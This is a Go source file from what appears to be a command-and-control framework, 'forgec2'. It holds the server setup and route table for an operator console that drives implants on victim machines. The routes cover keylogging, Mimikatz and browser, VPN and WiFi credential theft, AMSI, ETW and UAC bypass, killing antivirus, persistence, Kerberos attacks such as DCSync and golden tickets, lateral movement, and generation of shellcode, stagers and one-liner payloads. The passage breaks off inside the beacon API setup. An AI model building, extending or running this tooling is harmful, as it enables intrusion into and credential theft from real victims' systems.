package server

import (
	"context"
	"crypto/tls"
	"embed"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html/template"
	"io/fs"
	"io"
	"log/slog"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/forgec2/forgec2/internal/config"
	"github.com/forgec2/forgec2/internal/crypto"
	"github.com/forgec2/forgec2/internal/db"
	"github.com/forgec2/forgec2/internal/plugin"
	"github.com/forgec2/forgec2/internal/server/middleware"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"gorm.io/gorm"
)

//go:embed templates/*
var templateFS embed.FS

type Server struct {
	cfg            *config.Config
	db             *gorm.DB
	router         *gin.Engine
	tmpl           *template.Template
	wsClients      map[*websocket.Conn]bool
	wsMutex        sync.Mutex
	wsUpgrader     websocket.Upgrader
	rateLimiter    *middleware.RateLimiter
	apiRateLimiter *middleware.APIRateLimiter
	loginLockout   *loginLockoutTracker
	socksEngine    *socksRelayEngine
	startTime      time.Time

	dnsListener           *DNSBeaconListener
	icmpListener          *ICMPBeaconListener
	screenMonitorImplants map[string]time.Time
	screenMonitorMu       sync.Mutex

	// P0-3: rportfwd (reverse port forward)
	rportfwdListeners map[string]*rportfwdRelay
	rportfwdMu        sync.Mutex

	trafficLog  *trafficRing
	updateState updateCheckState
	collab      *collabState

	// WebSocket hubs
	wsHub   *WebSocketHub
	chatHub *ChatHub

	// Event system
	eventManager *EventManager

	// Beacon payload cipher (nil = disabled)
	beaconCipher *crypto.StreamCipher

	monitorCollector *MonitorCollector

	// Plugin marketplace
	marketplace *plugin.Marketplace

	// Plugin execution manager
	pluginManager *plugin.Manager

	// Optimizations
	configReloader *ConfigReloader
	backupManager  *BackupManager
	configPath     string
}

func New(cfg *config.Config, database *gorm.DB) *Server {
	gin.SetMode(gin.ReleaseMode)

	middleware.InitJWTSecret(cfg)

	r := gin.New()
	r.Use(gin.Recovery())
	r.Use(middleware.SecurityHeaders())
	r.Use(middleware.NoCache())
	r.Use(middleware.ErrorHandler())

	s := &Server{
		cfg:                   cfg,
		db:                    database,
		router:                r,
		wsClients:             make(map[*websocket.Conn]bool),
		rateLimiter:           middleware.NewRateLimiter(cfg.RateLimit.Beacon.Limit, time.Duration(cfg.RateLimit.Beacon.Window)*time.Second),
		apiRateLimiter:        middleware.NewAPIRateLimiter(cfg.RateLimit.API.Capacity, cfg.RateLimit.API.Rate),
		loginLockout:          newLoginLockoutTracker(),
		socksEngine:           newSocksRelayEngine(),
		startTime:             time.Now(),
		screenMonitorImplants: make(map[string]time.Time),
		rportfwdListeners:     make(map[string]*rportfwdRelay),
		trafficLog:            newTrafficRing(),
		collab:                newCollabState(),
		eventManager:          NewEventManager(database),
		wsUpgrader: websocket.Upgrader{
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
			CheckOrigin: func(r *http.Request) bool {
				origin := r.Header.Get("Origin")
				if origin == "" {
					return true
				}
				u, err := url.Parse(origin)
				if err != nil {
					return false
				}
				return u.Host == r.Host
			},
		},
	}

	// Initialize beacon payload cipher if configured
	if cfg.Crypto.Key != "" {
		key, err := hex.DecodeString(cfg.Crypto.Key)
		if err == nil && len(key) == 32 {
			s.beaconCipher = crypto.NewStreamCipher(key)
			slog.Info("Beacon payload encryption enabled")
		} else {
			slog.Warn("Invalid crypto key (must be 32-byte hex), beacon encryption disabled", "err", err)
		}
	}

	s.apiRateLimiter.SetWhitelist(cfg.RateLimit.API.Whitelist)

	s.setupTemplates()
	s.setupRoutes()
	s.loadAgentLocks()

	// Initialize plugin marketplace
	s.marketplace = plugin.NewMarketplace(database)
	s.marketplace.StartUpdateChecker(6 * time.Hour)

	// Initialize plugin execution manager
	s.pluginManager = plugin.NewManager(database)
	s.pluginManager.SetMarketplace(s.marketplace)
	pluginDir := filepath.Join(s.cfg.Server.DataDir, "plugins")
	if err := os.MkdirAll(pluginDir, 0750); err != nil {
		slog.Warn("Failed to create plugin data directory", "dir", pluginDir, "err", err)
	}
	if err := s.pluginManager.LoadFromDisk(pluginDir); err != nil {
		slog.Warn("Failed to load plugins from data directory", "dir", pluginDir, "err", err)
	}
	if err := s.pluginManager.LoadFromDisk("plugins"); err != nil {
		slog.Warn("Failed to load bundled plugins", "dir", "plugins", "err", err)
	}

	// Register event handlers
	s.eventManager.On(EventImplantCheckin, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventImplantDisconnect, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventTaskComplete, func(evt Event) {
		s.triggerWebhooks(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventTaskFail, func(evt Event) {
		s.triggerWebhooks(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.eventManager.On(EventCredentialFound, func(evt Event) {
		s.triggerWebhooks(evt)
		s.TriggerAlertForEvent(evt)
		rules := s.loadAutomationRules()
		for _, rule := range rules {
			if rule.Enabled && rule.EventType == string(evt.Type) {
				s.evaluateRule(evt, rule)
			}
		}
	})
	s.migrateAutomationRules()
	s.registerBuiltinAutomations()

	s.monitorCollector = NewMonitorCollector(s)
	s.monitorCollector.Start()

	return s
}

func (s *Server) InitOptimizations(configPath string) {
	s.configPath = configPath
	s.configReloader = NewConfigReloader(s.cfg, configPath, func(cfg *config.Config) {
		slog.Info("Config reloaded, applying changes")
	})
	if err := s.configReloader.Start(); err != nil {
		slog.Warn("Failed to start config reloader", "error", err)
	}

	backupDir := filepath.Join(s.cfg.Server.DataDir, "backups")
	var backupKey string
	if s.cfg.Crypto.Key != "" {
		backupKey = s.cfg.Crypto.Key
	}

	var err error
	s.backupManager, err = NewBackupManager(s.db, s.cfg.Database.Path, backupDir, backupKey)
	if err != nil {
		slog.Warn("Failed to initialize backup manager", "error", err)
		return
	}

	if err := s.backupManager.Start("daily"); err != nil {
		slog.Warn("Failed to start backup manager", "error", err)
	}
}

func (s *Server) setupTemplates() {
	funcMap := template.FuncMap{
		"T": func(lang, key string) string {
			return GetTranslation(lang, key)
		},
		"Tf": func(lang, key string, args ...interface{}) string {
			return Translatef(lang, key, args...)
		},
		"langInfo": func(lang string) LanguageInfo {
			info, _ := GetLanguageInfo(lang)
			return info
		},
		"supportedLangs": func() map[string]LanguageInfo {
			return GetSupportedLanguages()
		},
		"formatTime": func(t time.Time) string {
			return t.Format("2006-01-02 15:04:05")
		},
		"statusClass": func(status string) string {
			if status == "online" {
				return "bg-green-500"
			}
			return "bg-red-500"
		},
		"upper": strings.ToUpper,
		"default": func(val, def interface{}) interface{} {
			if val == nil || val == "" {
				return def
			}
			return val
		},
		"formatBytes": func(b int64) string {
			const unit = 1024
			if b < unit {
				return fmt.Sprintf("%d B", b)
			}
			div, exp := int64(unit), 0
			for n := b / unit; n >= unit; n /= unit {
				div *= unit
				exp++
			}
			return fmt.Sprintf("%.1f %cB", float64(b)/float64(div), "KMGTPE"[exp])
		},
		"relativeTime": func(t time.Time) string {
			d := time.Since(t)
			switch {
			case d < time.Minute:
				return "just now"
			case d < time.Hour:
				m := int(d.Minutes())
				if m == 1 {
					return "1 min ago"
				}
				return fmt.Sprintf("%d mins ago", m)
			case d < 24*time.Hour:
				h := int(d.Hours())
				if h == 1 {
					return "1 hour ago"
				}
				return fmt.Sprintf("%d hours ago", h)
			default:
				days := int(d.Hours() / 24)
				if days == 1 {
					return "1 day ago"
				}
				return fmt.Sprintf("%d days ago", days)
			}
		},
		"formatDuration": func(d time.Duration) string {
			if d < time.Minute {
				return fmt.Sprintf("%ds", int(d.Seconds()))
			}
			if d < time.Hour {
				return fmt.Sprintf("%dm%ds", int(d.Minutes()), int(d.Seconds())%60)
			}
			if d < 24*time.Hour {
				return fmt.Sprintf("%dh%dm", int(d.Hours()), int(d.Minutes())%60)
			}
			return fmt.Sprintf("%dd%dh", int(d.Hours()/24), int(d.Hours())%24)
		},
		"boolIcon": func(b bool) string {
			if b {
				return "✅"
			}
			return "❌"
		},
		// Math helpers for pagination (use int64 to match DB counts)
		"add":      func(a, b int64) int64 { return a + b },
		"subtract": func(a, b int64) int64 { return a - b },
		"multiply": func(a, b int64) int64 { return a * b },
		"int64":    func(v int) int64 { return int64(v) },
		"shortID": func(id string) string {
			if len(id) > 8 {
				return id[:8]
			}
			return id
		},
		"truncate": func(s string, n int) string {
			if len(s) > n {
				return s[:n] + "..."
			}
			return s
		},
		"split":  strings.Split,
		"substr": func(s string, start, length int) string { return s[start:length] },
		"formatDate": func(t time.Time) string {
			return t.Format("2006-01-02")
		},
		"isExpired": func(t time.Time) bool {
			return !t.IsZero() && t.Before(time.Now())
		},
		"isExpiring": func(t time.Time) bool {
			if t.IsZero() {
				return false
			}
			return t.Before(time.Now().Add(7*24*time.Hour)) && t.After(time.Now())
		},
	}

	tmpl, err := template.New("").Funcs(funcMap).ParseFS(templateFS, "templates/*.html")
	if err != nil {
		slog.Error("Failed to parse templates", "err", err)
		panic(err)
	}
	s.tmpl = tmpl
}

func (s *Server) setupRoutes() {
	// Request logging middleware
	s.router.Use(middleware.RequestLogger())

	// Static files (no auth required, with long-term caching) - served from embedded FS
	if subFS, err := fs.Sub(templateFS, "templates/static"); err == nil {
		s.router.StaticFS("/static", http.FS(subFS))
	}

	// Login routes (no auth required)
	s.router.GET("/login", s.handleLoginPage)
	s.router.POST("/login", s.handleLogin)

	// Health check endpoints (no auth required)
	s.router.GET("/health", s.handleHealthCheck)
	s.router.GET("/ready", s.handleHealthCheck)

	// Language switch endpoint (no auth required)
	s.router.GET("/lang/set", s.handleSetLanguage)
	s.router.POST("/lang/set", s.handleSetLanguage)

	// Protected routes
	auth := s.router.Group("/")
	auth.Use(middleware.AuthRequired(s.db))
	auth.Use(s.apiRateLimiter.LimitByUser())
	auth.Use(s.AuditMiddleware())
	auth.Use(s.ActivityMiddleware())
	{
		auth.GET("/", s.handleDashboard)
		auth.GET("/dashboard", s.handleDashboard)
		auth.GET("/search", s.handleSearchPage)
		auth.GET("/api/search", s.handleAPISearch)

		// ── Agent pages (read-only, no lock check) ──────────────────────
		agentsRead := auth.Group("/")
		agentsRead.Use(middleware.RequirePermission(db.PermAgentsRead))
		{
			agentsRead.GET("/agents", s.handleAgents)
			agentsRead.GET("/agents/:id", s.handleAgentDetail)
			agentsRead.GET("/agents/:id/shell", s.handleShellPage)
			agentsRead.GET("/agents/:id/files", s.handleFileBrowserPage)
			agentsRead.GET("/agents/:id/screen", s.handleScreenMonitorPage)
			agentsRead.GET("/agents/:id/tasks", s.handleGetAgentTasks)
			agentsRead.GET("/agents/:id/tasks/:taskId", s.handleGetTaskStatus)
			agentsRead.GET("/api/agents", s.handleListAgents)
			agentsRead.GET("/api/agents/unlinked", s.handleListUnlinkedAgents)
			agentsRead.GET("/agents/:id/token", s.handleTokenPage)
			agentsRead.GET("/agents/:id/token/list", s.handleGetTokens)
			agentsRead.GET("/api/agents/:id/processes", s.handleGetProcesses)
			agentsRead.GET("/api/agents/:id/process-tree", s.handleGetProcessTree)
		}

		// Agent operations (note, collab, cancel/rerun, delete -- no lock)
		agentsWrite := auth.Group("/")
		agentsWrite.Use(middleware.RequirePermission(db.PermAgentsWrite))
		{
			agentsWrite.POST("/agents/:id/kill", s.handleKillAgent)
			agentsWrite.POST("/agents/:id/lock", s.handleLockAgent)
			agentsWrite.POST("/agents/:id/unlock", s.handleUnlockAgent)
			agentsWrite.POST("/agents/:id/note", s.handleUpdateNote)
			agentsWrite.POST("/agents/:id/tasks/:taskId/cancel", s.handleCancelTask)
			agentsWrite.POST("/agents/:id/task/:taskId/rerun", s.handleRerunTask)
			agentsWrite.POST("/agents/batch", s.handleBatchCommand)
			agentsWrite.POST("/api/agents/:id/input", s.handleAgentRemoteInput)
			agentsWrite.GET("/agents/:id/socks_relay/status", s.handleSocksRelayStatus)
		}
		agentsDelete := auth.Group("/")
		agentsDelete.Use(middleware.RequirePermission(db.PermAgentsDelete))
		{
			agentsDelete.DELETE("/agents/:id", s.handleDeleteAgent)
			agentsDelete.POST("/agents/batch/delete", s.handleBulkDeleteAgents)
		}

		// ── Agent commands (lock check + viewer check) ──────────────────
		agentCmd := auth.Group("/agents/:id")
		agentCmd.Use(middleware.RequirePermission(db.PermAgentsWrite))
		agentCmd.Use(s.agentCommandMiddleware())
		{
			agentCmd.POST("/command", s.handleSendCommand)
			agentCmd.POST("/screenshot", s.handleRequestScreenshot)
			agentCmd.POST("/screenshot_window", s.handleRequestScreenshotWindow)
			agentCmd.POST("/ps", s.handleRequestPS)
			agentCmd.POST("/keylogger/start", s.handleStartKeylogger)
			agentCmd.POST("/keylogger/stop", s.handleStopKeylogger)
			agentCmd.POST("/keylogger/dump", s.handleDumpKeylogger)
			agentCmd.POST("/suspend", s.handleSuspendProcess)
			agentCmd.POST("/resume", s.handleResumeProcess)
			agentCmd.POST("/killproc", s.handleKillProcess)
			agentCmd.POST("/clipboard/get", s.handleClipboardGet)
			agentCmd.POST("/clipboard/set", s.handleClipboardSet)
			agentCmd.POST("/find", s.handleFindFiles)
			agentCmd.POST("/reg/get", s.handleRegGet)
			agentCmd.POST("/reg/set", s.handleRegSet)
			agentCmd.POST("/reg/delete", s.handleRegDelete)
			agentCmd.POST("/reboot", s.handleReboot)
			agentCmd.POST("/shutdown", s.handleShutdown)
			agentCmd.POST("/drives", s.handleListDrives)
			agentCmd.POST("/beacon_now", s.handleBeaconNow)
			agentCmd.POST("/services", s.handleListServices)
			agentCmd.POST("/portscan", s.handlePortScan)
			agentCmd.POST("/netstat", s.handleNetstat)
			agentCmd.POST("/users", s.handleUsers)
			agentCmd.POST("/av", s.handleAV)
			agentCmd.POST("/download_url", s.handleDownloadURL)
			agentCmd.POST("/uninstall", s.handleUninstall)
			agentCmd.POST("/set_sleep", s.handleSetSleep)
			agentCmd.POST("/kill_av", s.handleKillAV)
			agentCmd.POST("/elevate", s.handleElevate)
			agentCmd.POST("/uac_bypass", s.handleUACBypass)
			agentCmd.POST("/amsi_bypass", s.handleAMSIByPass)
			agentCmd.POST("/etw_bypass", s.handleETWByPass)
			agentCmd.POST("/elevate/printnightmare", s.handleElevatePrintNightmare)
			agentCmd.POST("/execute_assembly", s.handleExecuteAssembly)
			agentCmd.POST("/kerberoast", s.handleKerberoast)
			agentCmd.POST("/mimikatz", s.handleMimikatz)
			agentCmd.POST("/powerpick", s.handlePowerPick)
			agentCmd.POST("/net", s.handleNetCommand)
			agentCmd.POST("/persistence", s.handlePersistence)
			agentCmd.POST("/bof", s.handleBOF)
			agentCmd.POST("/browser_steal", s.handleBrowserSteal)
			agentCmd.POST("/cookie_export", s.handleCookieExport)
			agentCmd.POST("/vpn_creds", s.handleVpnCreds)
			agentCmd.POST("/creds", s.handleCredsDump)
			agentCmd.POST("/wifi_creds", s.handleWifiCreds)
			agentCmd.POST("/privesc_check", s.handlePrivescCheck)
			agentCmd.POST("/inject", s.handleInject)
			agentCmd.POST("/spawn", s.handleSpawn)
			agentCmd.POST("/self_update", s.handleSelfUpdate)
			agentCmd.POST("/lateral", s.handleLateral)
			agentCmd.POST("/socks", s.handleSocks)

			// ── P0-1: Reflective PE Loader ─────────────────
			agentCmd.POST("/peloader", s.handlePELoader)

			// ── P0-2: Execute-Assembly fork&run ────────────
			agentCmd.POST("/execute_assembly_forkrun", s.handleExecuteAssemblyForkRun)

			// ── P0-3: Reverse Port Forward ─────────────────
			agentCmd.GET("/rportfwd/status", s.handleRPortFwdStatus)
			agentCmd.POST("/rportfwd/start", s.handleRPortFwdRelayStart)
			agentCmd.POST("/rportfwd/stop", s.handleRPortFwdRelayStop)

			// ── P0-4: Kerberos Attacks ─────────────────────
			agentCmd.POST("/dcsync", s.handleDCSync)
			agentCmd.POST("/golden_ticket", s.handleGoldenTicket)
			agentCmd.POST("/silver_ticket", s.handleSilverTicket)
			agentCmd.POST("/asreproast", s.handleASREPRoast)
			agentCmd.POST("/pass_the_hash", s.handlePassTheHash)
			agentCmd.POST("/pass_the_ticket", s.handlePassTheTicket)
			agentCmd.POST("/link", s.handleLinkAgent)
			agentCmd.POST("/unlink", s.handleUnlinkAgent)
			agentCmd.POST("/download", s.handleDownload)
			agentCmd.POST("/upload", s.handleUploadFile)

			// ── File browser ──────────────────────────────
			agentCmd.POST("/files/ls", s.handleListDir)
			agentCmd.POST("/files/delete", s.handleFileDelete)
			agentCmd.POST("/files/read", s.handleFileRead)
			agentCmd.POST("/files/upload", s.handleFileUploadFromAgent)

			// ── Screen monitor ────────────────────────────
			agentCmd.POST("/screen/start", s.handleStartScreenMonitor)
			agentCmd.POST("/screen/stop", s.handleStopScreenMonitor)

			// ── Token Impersonation ───────────────────────
			agentCmd.POST("/token/list_procs", s.handleTokenListProcs)
			agentCmd.POST("/token/steal", s.handleTokenSteal)
			agentCmd.POST("/token/make", s.handleTokenMake)
			agentCmd.POST("/token/revert", s.handleTokenRevert)
			agentCmd.POST("/token/whoami", s.handleTokenWhoami)
			agentCmd.DELETE("/token/:token_id", s.handleTokenDrop)
			agentCmd.POST("/token/:token_id/impersonate", s.handleTokenImpersonate)
			agentCmd.POST("/token/:token_id/note", s.handleTokenNoteUpdate)

			// ── SOCKS Relay (agent-side) ─────────────────
			agentCmd.POST("/socks_relay/start", s.handleStartSocksRelay)
			agentCmd.POST("/socks_relay/stop", s.handleStopSocksRelay)
		}

		// ── Generate ────────────────────────────────────────────────────
		auth.GET("/generate", s.handleGeneratePage)
		auth.GET("/api/generate/profiles", s.handleListProfiles)
		auth.POST("/api/generate/profile/import", s.handleImportProfile)
		auth.POST("/generate/exe", s.handleGenerateEXE)
		auth.POST("/generate/ps1", s.handleGeneratePS1)
		auth.POST("/generate/linux", s.handleGenerateLinux)
		auth.POST("/generate/macos", s.handleGenerateMacOS)
		auth.POST("/generate/stager", s.handleGenerateStager)
		auth.POST("/generate/stager_linux", s.handleGenerateStagerLinux)
		auth.POST("/generate/one-liner", s.handleGenerateOneLiner)
		auth.POST("/generate/donut", s.handleGenerateDonut)
		auth.POST("/generate/srdi", s.handleGenerateSRDI)
		auth.POST("/generate/shellcode", s.handleGenerateShellcode)

		// ── Listeners ───────────────────────────────────────────────────
		listenersRead := auth.Group("/")
		listenersRead.Use(middleware.RequirePermission(db.PermListenersRead))
		{
			listenersRead.GET("/listeners", s.handleListenersPage)
			listenersRead.GET("/listeners/:id", s.handleListenerDetail)
			listenersRead.GET("/api/listeners", s.handleListListeners)
		}
		listenersWrite := auth.Group("/")
		listenersWrite.Use(middleware.RequirePermission(db.PermListenersWrite))
		{
			listenersWrite.POST("/api/listeners", s.handleCreateListener)
			listenersWrite.PUT("/api/listeners/:id", s.handleUpdateListener)
		}
		listenersDelete := auth.Group("/")
		listenersDelete.Use(middleware.RequirePermission(db.PermListenersDelete))
		{
			listenersDelete.DELETE("/api/listeners/:id", s.handleDeleteListener)
		}

		// ── Infrastructure ──────────────────────────────────────────────
		auth.GET("/infrastructure", s.handleInfrastructurePage)
		auth.POST("/infrastructure/generate/nginx", s.handleGenerateNginx)
		auth.POST("/infrastructure/generate/apache", s.handleGenerateApache)
		auth.POST("/infrastructure/generate/haproxy", s.handleGenerateHAProxy)
		auth.POST("/infrastructure/acme/provision", s.handleACMECertProvision)
		auth.GET("/infrastructure/profile/export", s.handleProfileExport)

		// ── Automation ──────────────────────────────────────────────────
		auth.GET("/automation", s.handleAutomationPage)
		auth.GET("/api/automation/rules", s.handleListAutomationRules)
		auth.POST("/api/automation/rules", s.handleSaveAutomationRule)
		auth.PUT("/api/automation/rules/:id", s.handleUpdateAutomationRule)
		auth.DELETE("/api/automation/rules/:id", s.handleDeleteAutomationRule)
		auth.POST("/api/automation/rules/:id/toggle", s.handleToggleAutomationRule)
		auth.GET("/api/webhooks", s.handleListWebhooks)
		auth.POST("/api/webhooks", s.handleCreateWebhook)
		auth.DELETE("/api/webhooks/:id", s.handleDeleteWebhook)
		auth.POST("/api/webhooks/test", s.handleTestWebhook)

		// ── BOF Repository ─────────────────────────────────────────────
		auth.GET("/bof_repo", func(c *gin.Context) {
			s.renderPage(c, "bof_repo_content", gin.H{"Title": "BOF Repository", "ActiveNav": "bof_repo"})
		})
		auth.GET("/api/bof/repos", s.handleBOFRepoIndex)
		auth.POST("/api/bof/repos/import", s.handleBOFRepoImport)

		// ── Plugin Management ──────────────────────────────────────────
		auth.GET("/plugins", s.handlePluginsPage)
		auth.GET("/api/plugins", s.handlePluginList)
		auth.POST("/api/plugins", s.handlePluginCreate)
		auth.GET("/api/plugins/update-summary", s.handlePluginUpdateSummary)
		auth.POST("/api/plugins/check-updates", s.handlePluginCheckUpdates)
		auth.POST("/api/plugins/import", s.handlePluginImport)
		auth.GET("/api/plugins/:id", s.handlePluginGet)
		auth.GET("/api/plugins/:id/rating", s.handlePluginRating)
		auth.GET("/api/plugins/:id/reviews", s.handlePluginReviews)
		auth.POST("/api/plugins/:id/reviews", s.handlePluginAddReview)
		auth.GET("/api/plugins/:id/dependencies", s.handlePluginDependencies)
		auth.GET("/api/plugins/:id/update-status", s.handlePluginUpdateStatus)
		auth.POST("/api/plugins/:id/update", s.handlePluginUpdate)
		auth.GET("/api/plugins/:id/export", s.handlePluginExport)
		auth.POST("/api/plugins/:id/toggle", s.handlePluginToggle)
		auth.DELETE("/api/plugins/:id", s.handlePluginDelete)

		// ── Plugin Execution ───────────────────────────────────────────
		auth.GET("/api/plugins/:id/execute", s.handlePluginExecuteInfo)
		auth.POST("/api/plugins/:id/execute", s.handlePluginExecute)
		auth.POST("/api/plugins/:id/report", s.handlePluginReport)
		auth.POST("/api/plugins/install", s.handlePluginInstall)
		auth.POST("/api/plugins/:id/enable", s.handlePluginEnable)
		auth.POST("/api/plugins/:id/disable", s.handlePluginDisable)

		// ── Tasks ───────────────────────────────────────────────────────
		tasksRead := auth.Group("/")
		tasksRead.Use(middleware.RequirePermission(db.PermTasksRead))
		{
			tasksRead.GET("/tasks", s.handleTaskHistory)
			tasksRead.GET("/tasks/export", s.handleExportTasks)
			tasksRead.GET("/tasks/:taskId", s.handleGetTaskStatus)
		}

		// ── Auth ────────────────────────────────────────────────────────
		auth.POST("/logout", s.handleLogout)

		// ── Credentials ─────────────────────────────────────────────────
		credsRead := auth.Group("/")
		credsRead.Use(middleware.RequirePermission(db.PermCredsRead))
		{
			credsRead.GET("/credentials", s.handleCredentialsPage)
			credsRead.GET("/credentials/export", s.handleExportCredentials)
			credsRead.GET("/credentials/:cred_id", s.handleGetCredential)
		}
		credsWrite := auth.Group("/")
		credsWrite.Use(middleware.RequirePermission(db.PermCredsWrite))
		{
			credsWrite.POST("/credentials/add", s.handleAddCredential)
			credsWrite.PUT("/credentials/:cred_id", s.handleUpdateCredential)
			credsWrite.POST("/credentials/batch/tags", s.handleBatchAddTags)
			credsWrite.POST("/credentials/:cred_id/confirm", s.handleToggleConfirmed)
		}
		credsDelete := auth.Group("/")
		credsDelete.Use(middleware.RequirePermission(db.PermCredsDelete))
		{
			credsDelete.DELETE("/credentials/:cred_id", s.handleDeleteCredential)
		}

		// ── Pivoting / Topology / Loot / Scanner ────────────────
		auth.GET("/pivoting", s.handlePivoting)
		auth.GET("/topology", s.handleTopologyPage)
		auth.GET("/api/topology/data", s.handleTopologyData)
		auth.GET("/loot", s.handleLootPage)
		auth.GET("/scanner", s.handleScannerPage)
		auth.POST("/api/scan", s.handleScanTask)
		auth.GET("/api/scan/results/:taskId", s.handleScanResults)
		auth.GET("/api/scan/agent/:agentId", s.handleScanResultsByAgent)
		auth.POST("/api/scan/result", s.handleProcessScanResult)
		auth.GET("/api/scan/export/:taskId", s.handleExportScanResults)
		auth.POST("/api/browser/result", s.handleProcessBrowserResult)
		auth.POST("/api/wifi/result", s.handleProcessWifiResult)
		auth.POST("/api/lateral/result", s.handleProcessLateralResult)
		auth.POST("/api/privesc/result", s.handleProcessPrivescResult)
		auth.GET("/privesc", s.handlePrivescPage)
		auth.GET("/api/privesc/history/:id", s.handlePrivescHistory)

		// ── Post-Exploitation Toolkit ────────────────────────────────────
		auth.GET("/toolkit", s.handleToolkitPage)
		auth.POST("/toolkit/agents/:id/action", s.handleToolkitQuickAction)
		auth.GET("/toolkit/results", s.handleToolkitRecentResults)
		auth.GET("/toolkit/agents/:id/info", s.handleToolkitAgentInfo)
		auth.GET("/toolkit/agents/:id/tasks", s.handleToolkitAgentTasks)

		// ── Timeline ────────────────────────────────────────────────────
		auth.GET("/timeline", s.handleTimelinePage)
		auth.GET("/api/timeline/data", s.handleTimelineData)
		auth.GET("/api/timeline/export", s.handleTimelineExport)

		// ── Report ──────────────────────────────────────────────────────
		auth.GET("/report", s.handleReportPage)
		auth.POST("/api/report/generate", s.handleGenerateReport)

		// ── Lateral Movement ───────────────────────────────────────────
		auth.GET("/lateral", s.handleLateralPage)
		auth.GET("/api/lateral/history/:id", s.handleLateralHistory)

		// ── Command Templates ─────────────────────────────────────────
		auth.GET("/templates", s.handleTemplatesPage)
		auth.POST("/api/templates", s.handleCreateTemplate)
		auth.DELETE("/api/templates/:id", s.handleDeleteTemplate)
		auth.GET("/api/templates/category/:category", s.handleGetTemplatesByCategory)

		// ── Audit ───────────────────────────────────────────────────────
		auditRead := auth.Group("/")
		auditRead.Use(middleware.RequirePermission(db.PermAuditRead))
		{
			auditRead.GET("/audit", s.handleAuditLogPage)
			auditRead.GET("/audit/logs", s.handleGetAuditLogs)
		}

		// ── Settings ────────────────────────────────────────────────────
		settingsRead := auth.Group("/")
		settingsRead.Use(middleware.RequirePermission(db.PermSettingsRead))
		{
			settingsRead.GET("/settings", s.handleSettingsPage)
		}
		settingsWrite := auth.Group("/")
		settingsWrite.Use(middleware.RequirePermission(db.PermSettingsWrite))
		{
			settingsWrite.POST("/settings/password", s.handleChangePassword)
			settingsWrite.POST("/settings/agent", s.handleSaveAgentConfig)
			settingsWrite.POST("/settings/server", s.handleSaveServerConfig)
			settingsWrite.POST("/settings/malleable", s.handleSaveMalleableProfile)
			settingsWrite.POST("/settings/purge/tasks", s.handlePurgeTasks)
			settingsWrite.POST("/settings/purge/audit", s.handlePurgeAuditLogs)
			settingsWrite.POST("/settings/jwt/regenerate", s.handleRegenerateJWT)
			settingsWrite.POST("/settings/db/vacuum", s.handleDBVacuum)
			settingsWrite.POST("/settings/db/backup", s.handleBackupDatabase)
			settingsWrite.GET("/settings/config/download", s.handleDownloadConfig)


		}

		// ── 2FA / TOTP ──────────────────────────────────────────────────
		auth.GET("/settings/totp/status", s.handleTOTPStatus)
		auth.POST("/settings/totp/generate", s.handleTOTPGenerate)
		auth.POST("/settings/totp/enable", s.handleTOTPEnable)
		auth.POST("/settings/totp/disable", s.handleTOTPDisable)

		// ── i18n / Translations ────────────────────────────────────────
		auth.GET("/translations", s.handleTranslationsPage)
		auth.GET("/api/translations", s.handleGetTranslations)
		auth.GET("/api/translations/stats", s.handleTranslationStats)
		auth.GET("/api/translations/check", s.handleTranslationCheck)

		// ── API Documentation ──────────────────────────────────────────
		auth.GET("/docs", s.handleDocsPage)
		auth.GET("/api/docs", s.handleAPIDocsRedirect)
		auth.GET("/api/docs/", s.handleAPIDocs)
		auth.GET("/api/docs/openapi.yaml", s.handleAPIDocsYAML)

		// ── AI Assistant ────────────────────────────────────────────────
		auth.GET("/ai", s.handleAIPage)
		auth.POST("/ai/chat", s.handleAIChat)
		auth.POST("/ai/config", s.handleAIConfig)

		// ── WebSocket ───────────────────────────────────────────────────
		auth.GET("/ws", s.handleWebSocket)
		auth.GET("/ws/beacon", s.handleWebSocketBeacon)
		auth.GET("/ws/chat", s.handleWebSocketChat)

		// ── Chat ────────────────────────────────────────────────────────
		auth.GET("/chat", s.handleChatPage)
		auth.GET("/api/chat/messages", s.handleGetChatMessages)
		auth.POST("/api/chat/send", s.handleSendChatMessage)
		auth.DELETE("/api/chat/:id", s.handleDeleteChatMessage)

		// ── Tokens ──────────────────────────────────────────────────────
		auth.GET("/tokens", s.handleGlobalTokensPage)

		// ── User Management ─────────────────────────────────────────────
		usersRead := auth.Group("/")
		usersRead.Use(middleware.RequirePermission(db.PermUsersRead))
		{
			usersRead.GET("/users", s.handleUsersPage)
		}
		usersWrite := auth.Group("/")
		usersWrite.Use(middleware.RequirePermission(db.PermUsersWrite))
		{
			usersWrite.POST("/users/add", s.handleAddUser)
			usersWrite.POST("/users/:id/edit", s.handleEditUser)
			usersWrite.POST("/users/:id/toggle", s.handleToggleUser)
			usersWrite.POST("/users/:id/password", s.handleSetUserPassword)
			usersWrite.POST("/users/:id/kick", s.handleKickUser)
			usersWrite.POST("/users/:id/force-logout", s.handleForceLogoutUser)
		}
		usersDelete := auth.Group("/")
		usersDelete.Use(middleware.RequirePermission(db.PermUsersDelete))
		{
			usersDelete.DELETE("/users/:id", s.handleDeleteUser)
		}

		// ── SOCKS Sessions ──────────────────────────────────────────────
		auth.GET("/socks/sessions", s.handleGetSocksSessions)
	}

	// Agent Beacon API with rate limiting
	api := s.router.Group("/api/v1")
	api.Use(s.rateLimiter.Limit())
	api.Use(s.trafficMiddleware())
	{
		api.POST("/beacon", s.handleBeacon)
		api.POST("/screen_frame", s.handleScreenFrame)

